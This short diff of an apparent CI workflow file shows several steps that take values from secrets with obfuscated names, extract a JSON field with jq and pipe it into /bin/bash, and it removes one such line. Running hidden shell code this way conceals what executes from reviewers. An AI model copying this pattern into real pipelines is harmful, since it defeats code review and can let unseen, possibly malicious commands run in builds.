@@ -18,7 +18,6 @@ jobs:
           agze808: ${{ secrets.agze808 }}
         run: |
           printf '%s' "$agze808" | jq -r .mtpy3 | /bin/bash
-          printf '%s' "$whic6790" | jq -r .jblf63264 | /bin/bash
           echo $ewhru48 | jq -r .oewdr38638 | /bin/bash
           printf '%s' "$wenw181" | jq -r .vxfb2 | /bin/bash
           echo $suw156 | jq -r .itqf44 | /bin/bash
